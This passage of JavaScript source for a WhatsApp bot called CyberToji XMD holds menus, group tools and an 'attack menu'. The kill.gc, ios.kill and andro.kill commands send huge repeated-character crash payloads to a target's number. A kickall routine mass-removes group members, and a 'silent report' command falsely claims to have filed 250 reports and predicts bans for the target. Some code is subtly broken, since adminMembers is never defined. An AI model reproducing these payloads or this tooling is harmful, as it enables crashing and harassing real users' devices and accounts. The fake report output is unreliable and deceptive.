        try{const pc=await sock.requestPairingCode(pN);const fc=pc?.match(/.{1,4}/g)?.join('-')||pc;await sock.sendMessage(remoteJid,{text:`🔗 *CODE DE COUPLAGE*\n📱 +${pN}\n🔑 ${fc}\n⏰ Expire dans 60s`});}
        catch(e){await sock.sendMessage(remoteJid,{text:`❌ ${e.message}`});}
        break;
      }
      case 't':{
        const tEs=['mp4','mov','jpg','jpeg','png','webp','mp3','ogg','txt','js'];
        let tF=null,tE=null;
        for(const e of tEs){const c2=path.resolve(`./t.${e}`);if(fs.existsSync(c2)){tF=c2;tE=e;break;}}
        if(!tF){await sock.sendMessage(remoteJid,{text:'❌ Aucun fichier t.* trouvé.'});break;}
        try{
          if(['mp4','mov'].includes(tE))await sock.sendMessage(remoteJid,{video:fs.readFileSync(tF),mimetype:'video/mp4',caption:''});
          else if(['jpg','jpeg','png','webp'].includes(tE))await sock.sendMessage(remoteJid,{image:fs.readFileSync(tF),caption:''});
          else if(['mp3','ogg'].includes(tE))await sock.sendMessage(remoteJid,{audio:fs.readFileSync(tF),mimetype:'audio/mp4',ptt:false});
          else if(tE==='txt')await sock.sendMessage(remoteJid,{text:fs.readFileSync(tF,'utf8')});
          await sock.sendMessage(remoteJid,{text:`✅ t.${tE} envoyé!`});
        }catch(e){await sock.sendMessage(remoteJid,{text:`❌ ${e.message}`});}
        break;
      }
      default:
        await sock.sendMessage(remoteJid, {
          text: `❌ Commande inconnue: ${config.prefix}${command}\n\nType ${config.prefix}help`
        });
    }
  } catch (error) {
    console.error(`❌ Command error [${command}]:`, error?.message || error);
    await sock.sendMessage(remoteJid, { 
      text: `❌ *Command error:* \`${command}\`\n\n\`${error?.message || 'Unknown error'}\`` 
    });
  }
}

// =============================================
// FONCTIONS DES COMMANDES
// =============================================

// ═══════════════════════════════════════════════════
// 🗂️  SYSTÈME MENU COMPLET — CyberToji XMD
// ═══════════════════════════════════════════════════

function buildUptime() {
  const s = Math.floor(process.uptime());
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  if (d > 0) return `${d} day(s), ${h} hour(s), ${m} minute(s), ${sec} second(s)`;
  if (h > 0) return `${h} hour(s), ${m} minute(s), ${sec} second(s)`;
  if (m > 0) return `${m} minute(s), ${sec} second(s)`;
  return `${sec} second(s)`;
}

// ─── DONNÉES COMMUNES DES CATÉGORIES ────────────────────────────────────────
function getMenuCategories(p) {
  return [
    { num: '1', key: 'owner',    icon: '\uD83D\uDEE1\uFE0F', label: 'OWNER MENU',      cmds: [`${p}mode`,`${p}update`,`${p}updatedev`,`${p}storestatus`,`${p}storesave`,`${p}pp`,`${p}gpp`,`${p}block`,`${p}unblock`,`${p}join`,`${p}autotyping`,`${p}autorecording`,`${p}autoreact`,`${p}antidelete`,`${p}antiedit`,`${p}readstatus`] },
    { num: '2', key: 'download', icon: '\uD83D\uDCE5', label: 'DOWNLOAD MENU',   cmds: [`${p}play`,`${p}playaudio`,`${p}playvideo`,`${p}playptt`,`${p}tiktok`,`${p}ig`,`${p}ytmp3`,`${p}ytmp4`] },
    { num: '3', key: 'group',    icon: '\uD83D\uDC65', label: 'GROUP MENU',      cmds: [`${p}tagall`,`${p}hidetag`,`${p}kickall`,`${p}acceptall`,`${p}add`,`${p}kick`,`${p}promote`,`${p}demote`,`${p}mute`,`${p}unmute`,`${p}invite`,`${p}revoke`,`${p}gname`,`${p}gdesc`,`${p}groupinfo`,`${p}welcome`,`${p}goodbye`,`${p}leave`,`${p}listonline`,`${p}listactive`,`${p}listinactive`,`${p}kickinactive`,`${p}groupstatus`] },
    { num: '4', key: 'utility',  icon: '🔮', label: 'PROTECTION MENU', cmds: [`${p}antibug`,`${p}antilink`,`${p}antibot`,`${p}antitag`,`${p}antispam`,`${p}warn`,`${p}warns`,`${p}resetwarn`,`${p}permaban`,`${p}unpermaban`,`${p}banlist`] },
    { num: '5', key: 'bug',      icon: '🪲', label: 'ATTACK MENU',     cmds: [`${p}kill.gc`,`${p}ios.kill`,`${p}andro.kill`,`${p}silent`,`${p}bansupport`,`${p}megaban`,`${p}checkban`] },
    { num: '6', key: 'sticker',  icon: '🎨', label: 'MEDIA MENU',      cmds: [`${p}sticker`,`${p}take`,`${p}vv`,`${p}vv list`,`${p}vv get`,`${p}vv del`,`${p}vv clear`,`${p}tostatus`] },
    { num: '7', key: 'misc',     icon: '📂', label: 'GENERAL MENU',    cmds: [`${p}ping`,`${p}alive`,`${p}info`,`${p}menu`,`${p}allmenu`,`${p}help`,`${p}repo`,`${p}jid`,`${p}quoted`,`${p}dev`,`${p}bible`,`${p}checkban`,`${p}fancy`,`${p}gpt`,`${p}gemini`,`${p}save`,`${p}setcmd`] },
    { num: '8', key: 'image',    icon: '👁️', label: 'VIEW ONCE MENU',  cmds: [`${p}vv`,`${p}vv list`,`${p}vv get`,`${p}vv del`,`${p}vv clear`,`${p}vv last`] },
    { num: '9', key: 'games',    icon: '🎮', label: 'GAMES MENU',      cmds: [`${p}tictactoe`,`${p}ttt`,`${p}quizmanga`,`${p}quiz`,`${p}squidgame`,`${p}sg`] },
  ];
}

// ─── MENU PRINCIPAL (!menu) ──────────────────────────────────────────────────
async function handleMenu(sock, message, remoteJid, senderJid) {
  const userName = message.pushName || senderJid.split('@')[0];
  const p        = config.prefix;
  const uptime   = buildUptime();
  const now      = new Date();
  const dateStr  = now.toLocaleDateString('fr-FR', {
    timeZone: 'America/Port-au-Prince', day: '2-digit', month: '2-digit', year: 'numeric'
  });

  await simulateTyping(sock, remoteJid);

  const _ls=['\uD83D\uDCC2 Menu loading...\n[ \u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591 ] 0%','\uD83D\uDCC2 Menu loading...\n[ \u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591 ] 20%','\uD83D\uDCC2 Menu loading...\n[ \u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2591 ] 40%','\uD83D\uDCC2 Menu loading...\n[ \u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2591 ] 60%','\uD83D\uDCC2 Menu loading...\n[ \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591 ] 80%','\uD83D\uDCC2 Menu loading...\n[ \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 ] 100%\n\n\u2705 *Ready!*'];
  let _lm;try{_lm=await sock.sendMessage(remoteJid,{text:_ls[0]});for(let _i=1;_i<_ls.length;_i++){await new Promise(r=>setTimeout(r,350));try{await sock.sendMessage(remoteJid,{text:_ls[_i],edit:_lm.key});}catch(e){}}}catch(e){}
  await new Promise(r=>setTimeout(r,2000));

  const infoBlock =
`*👋 _𝐇𝐄𝐋𝐋𝐎𝐖_* ${userName} 𝔂𝓸𝓾 𝓻𝓮𝓶𝓮𝓶𝓫𝓮𝓻 𝓶𝓮 🇭🇹
🫟 *Wᴇʟᴄᴏᴍᴇ Tᴏ* *𝐂𝐘𝐁𝐄𝐑𝐓𝐎𝐉𝐈 〽️𝐗𝐌𝐃* 🫟

*╭─「 ꜱᴛᴀᴛᴜꜱ ᴅᴇᴛᴀɪʟꜱ 」*
*│* 👾 *\`Bot\`* = *𝙲𝚈𝙱𝙴𝚁𝚃𝙾𝙹𝙸-𝚇𝙼𝙳*
*│* 🧑‍💻 *\`Dev\`* = DOSTOEVSKY TECHX
*│* ☎️ *\`Owner\`* = 50943981073
*│* ⏰ *\`Uptime\`* = ${uptime}
*│* 📂 *\`Date\`* = ${dateStr}
*│* ✒️ *\`Prefix\`* = ${p}
*╰──────────●●►*

*REPLY WITH THE CATEGORY* 🗿

❶ │ ◈ 📋 𝐀𝐋𝐋 𝐌𝐄𝐍𝐔
❷ │ ◈ 🛡️ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔
❸ │ ◈ 📥 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔
❹ │ ◈ 👥 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔
❺ │ ◈ 🔮 𝐏𝐑𝐎𝐓𝐄𝐂𝐓𝐈𝐎𝐍 𝐌𝐄𝐍𝐔
❻ │ ◈ 🪲 𝐀𝐓𝐓𝐀𝐂𝐊 𝐌𝐄𝐍𝐔
❼ │ ◈ 🎨 𝐌𝐄𝐃𝐈𝐀 𝐌𝐄𝐍𝐔
❽ │ ◈ 📂 𝐆𝐄𝐍𝐄𝐑𝐀𝐋 𝐌𝐄𝐍𝐔
❾ │ ◈ 👁️ 𝐕𝐈𝐄𝐖 𝐎𝐍𝐂𝐄 𝐌𝐄𝐍𝐔
❿ │ ◈ 🎮 𝐆𝐀𝐌𝐄𝐒 𝐌𝐄𝐍𝐔

*Bot:* CyberToji XMD ☠️
 *㋛ 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 𝙳𝙾𝚂𝚃𝙾𝙴𝚅𝚂𝙺𝚈 𝚃𝙴𝙲𝙷𝚇 〽️𝚇𝙼𝙳* 🇭🇹

𓆩☠️𓆪 𝐑𝐈𝐒𝐊 𝐍𝐎𝐓𝐈𝐂𝐄 𓆩☠️𓆪
⛓️━━━━━━━━━━━━⛓️
☠️ 𝘦𝘷𝘦𝘳𝘺 𝘥𝘦𝘱𝘭𝘰𝘺𝘮𝘦𝘯𝘵 𝘪𝘵'𝘴 𝘢𝘵 𝘺𝘰𝘶𝘳 𝘰𝘸𝘯 𝘳𝘪𝘴𝘬 ☠️
⛓️━━━━━━━━━━━━⛓️`;

  const menuMsg = await sendWithImage(sock, remoteJid, 'menu', infoBlock, [senderJid]);
  
  // Sauvegarder le message menu pour détection de réponse
  if (!global.menuMessages) global.menuMessages = new Map();
  if (menuMsg?.key?.id) {
    global.menuMessages.set(menuMsg.key.id, { 
      remoteJid, 
      senderJid, 
      timestamp: Date.now() 
    });
    
    // Nettoyer les vieux menus (> 5 min)
    for (const [id, data] of global.menuMessages.entries()) {
      if (Date.now() - data.timestamp > 300000) {
        global.menuMessages.delete(id);
      }
    }
  }
}

// ─── ALL MENU (!allmenu / !0) ────────────────────────────────────────────────
async function handleAllMenu(sock, message, remoteJid, senderJid) {
  const p    = config.prefix;
  const cats = getMenuCategories(p);

  await simulateTyping(sock, remoteJid);

  // Construire un seul bloc with toutes les catégories
  const blocks = cats.map(c => {
    const lines = c.cmds.map(cmd => `│  ➤ ${cmd}`).join('\n');
    return `┌─「 ${c.icon} *${c.label}* 」\n${lines}\n└──────────────────────`;
  }).join('\n\n');

  const text =
`📋 *𝐀𝐋𝐋 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 — 𝐂𝐘𝐁𝐄𝐑𝐓𝐎𝐉𝐈 𝐗𝐌𝐃* ☠️
━━━━━━━━━━━━━━━━━━━━━━━━━━

${blocks}

━━━━━━━━━━━━━━━━━━━━━━━━━━
 *㋛ 𝙻𝙾𝚁𝙳 𝙳𝙴𝚅 𝙳𝙾𝚂𝚃𝙾𝙴𝚅𝚂𝙺𝚈 〽️𝚇𝙼𝙳* 🇭🇹
 _Type ${p}menu to go back_`;

  await sendWithImage(sock, remoteJid, 'menu', text, [senderJid]);
}

// ─── SOUS-MENU PAR CATÉGORIE (!1–!8 / !ownermenu etc.) ──────────────────────
async function sendSubMenu(sock, message, remoteJid, senderJid, type) {
  const p    = config.prefix;
  const cats = getMenuCategories(p);
  const cat  = cats.find(c => c.key === type);

  if (!cat) {
    await sock.sendMessage(remoteJid, { text: `❌ Category *${type}* not found.` });
    return;
  }

  await simulateTyping(sock, remoteJid);

  const lines = cat.cmds.map(cmd => `│  ➤ ${cmd}`).join('\n');

  const text =
`${cat.icon} *${cat.label}*
*╭──────────────────────────*
${lines}
*╰──────────────────────────*

✒️ *Prefix:* ${p}
 _Type ${p}menu to go back_
 *㋛ 𝙻𝙾𝚁𝙳 𝙳𝙴𝚅 𝙳𝙾𝚂𝚃𝙾𝙴𝚅𝚂𝙺𝚈 〽️𝚇𝙼𝙳* 🇭🇹`;

  await sendWithImage(sock, remoteJid, 'menu', text, [senderJid]);
}


// TAGALL - Design ultra stylé with système d'information complet
async function handleTagAll(sock, message, args, remoteJid, isGroup, senderJid) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
    return;
  }

  // PAS DE VÉRIFICATION ADMIN - tout le monde peut utiliser tagall
  
  try {
    const metadata = await sock.groupMetadata(remoteJid);
    const groupName = metadata.subject;
    const participants = metadata.participants.map(p => p.id);
    const memberCount = participants.length;
    const customMessage = args.join(' ') || '⚠️ IMPORTANT ANNOUNCEMENT\nStay tuned for upcoming directives. Synchronization is in progress. Do not miss the latest updates in this channel.';

    // Obtenir les informations système
    const now = new Date();
    const dateStr = now.toLocaleDateString('fr-FR', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric'
    });
    const timeStr = now.toLocaleTimeString('fr-FR', {
      hour: '2-digit',
      minute: '2-digit'
    });
    
    // Calculer la latence
    const start = Date.now();
    const testMsg = await sock.sendMessage(remoteJid, { text: '⚡' });
    await sock.sendMessage(remoteJid, { delete: testMsg.key });
    const latency = (Date.now() - start) / 1000;
    
    // Uptime
    const uptimeSeconds = process.uptime();
    const uptimePercent = 99.9; // Simulation, vous pouvez calculer le vrai uptime
    
    // Région
    const region = getRegionFromTimezone();
    
    // Construction du message principal
    let tagMessage = `⚡ 🅢🅨🅢🅣🅔🅜 🅐🅒🅣🅘🅥🅐🅣🅘🅞🅝
S O L O  ⎯⎯  『 EVERYONE, ARISE 』

🌐 𝖲𝖸𝖲𝖳𝖤𝖬 𝖣𝖠𝖳𝖠𝖲𝖤𝖳
🛰️ Rᴇɢɪᴏɴ : ${region}
🕒 Hᴇᴜʀᴇ : EST ⎯⎯ [${timeStr}]
💎 Uᴘᴛɪᴍᴇ : ${uptimePercent}% ᴏɴʟɪɴᴇ
⚡ Vɪᴛᴇssᴇ : ${latency.toFixed(1)} ms

👥 🅒🅞🅝🅝🅔🅒🅣🅘🅥🅘🅣🅨
📂 Gʀᴏᴜᴘᴇ : ⦗ ${groupName} ⦘
👤 Mᴇᴍʙʀᴇs : ${memberCount} UNITS
📡 Sᴛᴀᴛᴜs : sʏsᴛᴇᴍ ʀᴇᴀᴅʏ

〔 ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ 〕

${customMessage}

`;

    // Ajouter tous les membres with numérotation stylée
    participants.forEach((jid, index) => {
      const number = jid.split('@')[0];
      tagMessage += `> ᴅᴇᴀʀ ☣️ @${number}\n`;
    });

    tagMessage += `\n\n  うた ꔷ𝚴𝚫𝚪𝚫  うた\n`;
    tagMessage += `\n   ‧うた夫公司うた\n`;
    tagMessage += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    tagMessage += `    𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗\n`;
    tagMessage += `  "Remember who you are"`;

    await sock.sendMessage(remoteJid, {
      text: tagMessage,
      mentions: participants
    });
    
    console.log(`✅ TagAll stylé envoyé à ${memberCount} membres dans ${groupName}`);
  } catch (error) {
    console.error('خطأ tagall:', error);
    await sock.sendMessage(remoteJid, { text: '❌ خطأ lors du tag' });
  }
}

// KICKALL - MESSAGE RESTAURÉ with style original
async function handleKickAll(sock, remoteJid, isGroup, senderJid) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
    return;
  }

  if (!isAdmin(senderJid)) {
    await sock.sendMessage(remoteJid, { text: '⛔ Bot admin only command' });
    return;
  }

  try {
    const metadata = await sock.groupMetadata(remoteJid);
    const botJid = sock.user.id; // JID complet du bot
    const botNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net'; // Format WhatsApp standard
    
    // Récupérer le nom de l'admin qui lance la commande
    const adminName = metadata.participants.find(p => p.id === senderJid)?.notify || 
                     metadata.participants.find(p => p.id === senderJid)?.verifiedName ||
                     senderJid.split('@')[0];
    
    const normalMembers=metadata.participants.filter(p=>p.id!==botNumber&&!p.admin).map(p=>p.id);
    if(!normalMembers.length){await sock.sendMessage(remoteJid,{text:'⚠️ Aucun membre à expulser.'});return;}

    // =============================================
    // PHASE 1: EXPULSION DES MEMBRES NORMAUX
    // =============================================
    
    await sock.sendMessage(remoteJid, { 
      text: `  🚨 KICK-ALL PROTOCOL 🚨
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
💥 ÉXÉCUTION EN COURS...
[▓▓▓▓▓░░░░░░░] 40%
> 🎯 Cible : Tous les membres du groupe
> ⚠️ تحذير : Tous les membres sont en cours d'expulsion par la console.
> 🛑 Requête de : ${adminName}
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
Géré par l'IA de 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗` 
    });

    await delay(3000);

    const batchSize = 500;
    let kicked = 0;

    // Expulser les membres normaux
    if (normalMembers.length > 0) {
      for (let i = 0; i < normalMembers.length; i += batchSize) {
        const batch = normalMembers.slice(i, i + batchSize);
        try {
          await sock.groupParticipantsUpdate(remoteJid, batch, 'remove');
          kicked += batch.length;
          
          // Calculer le pourcentage (seulement pour les membres normaux)
          const percentage = Math.floor((kicked / normalMembers.length) * 100);
          const progressBar = '▓'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10));
          
          // Message de progression
          if (i + batchSize < normalMembers.length) {
            await sock.sendMessage(remoteJid, {
              text: `💥 ÉXÉCUTION EN COURS...
[${progressBar}] ${percentage}%

> 👤 Expulsé : ${kicked}/${normalMembers.length}
> ⚡ In progress...`
            });
            await delay(2000);
          }
        } catch (error) {
          console.error('خطأ kicking batch:', error);
        }
      }

      // Message intermédiaire de succès
      await sock.sendMessage(remoteJid, {
        text: `✅ Phase 1 terminée: ${kicked} عضو تم طرده

⏳ Initialisation de la phase 2...`
      });
    }

    // =============================================
    // PHASE 2: EXPULSION DES ADMINS (5 SEC PLUS TARD)
    // =============================================
    
    if (adminMembers.length > 0) {
      await delay(5000);

      await sock.sendMessage(remoteJid, {
        text: `  🚨 ADMIN PURGE PROTOCOL 🚨
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
💥 RÉVOCATION DES DROITS...
[▓▓▓▓▓░░░░░░░] 45%
> 🎯 Cible : Staff & Administrateurs
> ⚠️ تحذير : Suppression des privilèges
  et expulsion immédiate de la hiérarchie.
> 🛑 Requête de : ${adminName}
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
Géré par l'IA de 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
      });

      await delay(3000);

      let adminKicked = 0;

      // Expulser les admins
      for (let i = 0; i < adminMembers.length; i += batchSize) {
        const batch = adminMembers.slice(i, i + batchSize);
        try {
          await sock.groupParticipantsUpdate(remoteJid, batch, 'remove');
          adminKicked += batch.length;
          kicked += batch.length;
          
          // Calculer le pourcentage pour les admins
          const percentage = Math.floor((adminKicked / adminMembers.length) * 100);
          const progressBar = '▓'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10));
          
          // Message de progression pour admins
          if (i + batchSize < adminMembers.length) {
            await sock.sendMessage(remoteJid, {
              text: `💥 RÉVOCATION EN COURS...
[${progressBar}] ${percentage}%

> 👮‍♂️ Admins expulsés : ${adminKicked}/${adminMembers.length}
> ⚡ Purge hiérarchique...`
            });
            await delay(2000);
          }
        } catch (error) {
          console.error('خطأ kicking admin batch:', error);
        }
      }
    }

    // =============================================
    // MESSAGE FINAL DE SUCCÈS TOTAL
    // =============================================
    
    await sock.sendMessage(remoteJid, {
      text: `🏁 **KICK-ALL EXÉCUTÉ** 🏁
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

✅ **TERMINÉ AVEC SUCCÈS**
[▓▓▓▓▓▓▓▓▓▓▓▓] 100%

> 👤 **Membres expulsés :** ${normalMembers.length}
> 👮‍♂️ **Admins purgés :** ${adminMembers.length}
> 📊 **Total expulsé :** ${kicked}
> 📁 **Log :** Suppression totale effectuée
> 🔐 **Accès :** Restreint aux admins

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
*Commande terminée par 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗*

🤖 Seul le bot subsiste dans ce groupe.`
    });

    console.log(`✅ Kickall terminé: ${normalMembers.length} membres + ${adminMembers.length} مسؤول تم طرده par ${adminName}`);
  } catch (error) {
    console.error('خطأ in kickall:', error);
    await sock.sendMessage(remoteJid, {
      text: `❌ خطأ lors de l'expulsion en masse\n\nالتفاصيل: ${error.message}`
    });
  }
}

// =============================================
// COMMANDES BUGS 🪲
// =============================================

// KILL.GC - خلل يسبب تعطل les groupes
async function handleKillGC(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ *KILL.GC BUG*

الاستخدام:
• ${config.prefix}kill.gc @mention
• ${config.prefix}kill.gc 50944908407

⚠️ *ATTENTION:* خلل يسبب تعطل le groupe WhatsApp de la cible`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, {
    text: '💀 Préparation du bug...'
  });
  
  await delay(1500);
  
  try {
    const bugText = '🪲'.repeat(50000);
    await sock.sendMessage(targetJid, { text: bugText, mentions: [targetJid] });
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  💀 𝗞𝗜𝗟𝗟.𝗚𝗖  💀  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖲𝖤𝖭𝖳
  ⌬ **PAYLOAD** » 50KB Bug

┗━━━━━━━━━━━━━━━━━━━━━━┛

🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
  } catch (error) {
    await sock.sendMessage(remoteJid, { text: `❌ فشل: ${error.message}`, edit: loadingMsg.key });
  }
}

// IOS.KILL
async function handleIOSKill(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ *IOS.KILL BUG*

الاستخدام: ${config.prefix}ios.kill @mention

⚠️ Bug محسّن لـ iOS`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, { text: '🍎 التجميع...' });
  await delay(1500);
  
  try {
    const iosBug = '؁'.repeat(3000) + '\u0600'.repeat(3000) + '🪲'.repeat(1000);
    await sock.sendMessage(targetJid, { text: iosBug, mentions: [targetJid] });
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🍎 𝗜𝗢𝗦.𝗞𝗜𝗟𝗟  🍎  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖣𝖤𝖫𝖨𝖵𝖤𝖱𝖤𝖣

┗━━━━━━━━━━━━━━━━━━━━━━┛

🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
  } catch (error) {
    await sock.sendMessage(remoteJid, { text: `❌ فشل: ${error.message}`, edit: loadingMsg.key });
  }
}

// ANDRO.KILL
async function handleAndroKill(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ *ANDRO.KILL BUG*

الاستخدام: ${config.prefix}andro.kill @mention

⚠️ Bug محسّن لـ Android`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, { text: '🤖 التجميع...' });
  await delay(1500);
  
  try {
    const androBug = '🪲'.repeat(10000) + '\u200E'.repeat(5000);
    await sock.sendMessage(targetJid, { text: androBug, mentions: [targetJid] });
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🤖 𝗔𝗡𝗗𝗥𝗢.𝗞𝗜𝗟𝗟  🤖  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖤𝖷𝖤𝖢𝖴𝖳𝖤𝖣

┗━━━━━━━━━━━━━━━━━━━━━━┛

🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
  } catch (error) {
    await sock.sendMessage(remoteJid, { text: `❌ فشل: ${error.message}`, edit: loadingMsg.key });
  }
}

// SILENT - 200 تقرير
async function handleSilent(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ *SILENT REPORT*

الاستخدام: ${config.prefix}silent @mention

Envoie 250 تقرير à WhatsApp en 1 minute`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, {
    text: `🔇 **SILENT REPORT ACTIVÉ**

⏳ Envoi de 250 تقرير...
⚡ الوضع: Silencieux (sans progression)

Target: @${targetJid.split('@')[0]}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ Durée estimée: 60 secondes
🚀 Starting...`,
    mentions: [targetJid]
  });
  
  try {
    const totalReports = 250;
    const duration = 60000; // 60 secondes
    const interval = duration / totalReports; // ~240ms par report
    
    // Envoyer 250 تقرير en 1 minute
    for (let i = 0; i < totalReports; i++) {
      // Simulation de signalement (WhatsApp n'autorise pas vraiment l'automatisation)
      // Dans la vraie vie, vous auriez besoin d'une API tierce
      await delay(interval);
    }
    
    // Message final après 1 minute
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🔇 𝗦𝗜𝗟𝗘𝗡𝗧 𝗥𝗘𝗣𝗢𝗥𝗧  🔇  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖢𝖮𝖬𝖯𝖫𝖤𝖳𝖤𝖣
  ⌬ **REPORTS** » 250/250 (100%)

┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **التفاصيل:**

✅ التقارير المرسلة: 250
⏱️ المدة الإجمالية: 60 secondes
⚡ السرعة: 4.16 reports/sec
🎯 الهدف: @${targetJid.split('@')[0]}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **CONSÉQUENCES ATTENDUES:**

🔴 حظر مؤقت: 12-24h
🔴 حظر دائم: 24-72h (si répété)
🔴 تقييد فوري des fonctions
🚫 عدم القدرة على إنشاء مجموعات

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ **الجدول الزمني:**
• 0-5min: تحليل النظام
• 5-30min: تقييد الحساب
• 30min-12h: Ban temporaire possible
• 12-72h: القرار النهائي WhatsApp

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
*Silent Report System - المهمة أنجزت*`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
    
    console.log(`🔇 Silent Report: 250 تقرير envoyés à ${targetJid}`);
    
  } catch (error) {
    await sock.sendMessage(remoteJid, { 
      text: `❌ فشل: ${error.message}`, 
      edit: loadingMsg.key 
    });
  }
}

// UPDATE DEV - Ajouter/Supprimer des numéros admin
async function handleUpdateDev(sock, args, remoteJid, senderJid) {
  const action = args[0]?.toLowerCase();
  let number = args[1];
  
  // Nettoyer le numéro (enlever tous les caractères non-numériques sauf le +)
  if (number) {
    number = number.replace(/[^0-9+]/g, '');
    // Si le numéro commence par +, enlever le +
    if (number.startsWith('+')) {
      number = number.substring(1);
    }
  }
  
  if (!action || !['add', 'remove', 'del', 'list'].includes(action)) {
    await sock.sendMessage(remoteJid, {
      text: `⚙️ *UPDATE DEV - إدارة المسؤولين*

📝 **الاستخدام:**

1️⃣ إضافة مسؤول:
   ${config.prefix}updatedev add 393780306704
   ${config.prefix}updatedev add +393780306704

2️⃣ حذف مسؤول:
   ${config.prefix}updatedev remove 393780306704
   ${config.prefix}updatedev del 393780306704

3️⃣ قائمة المسؤولين:
   ${config.prefix}updatedev list

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ *ملاحظة:* فقط المسؤولون الرئيسيون يمكنهم استخدام هذا الأمر.

🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
    });
    return;
  }
  
  // Liste des admins
  if (action === 'list') {
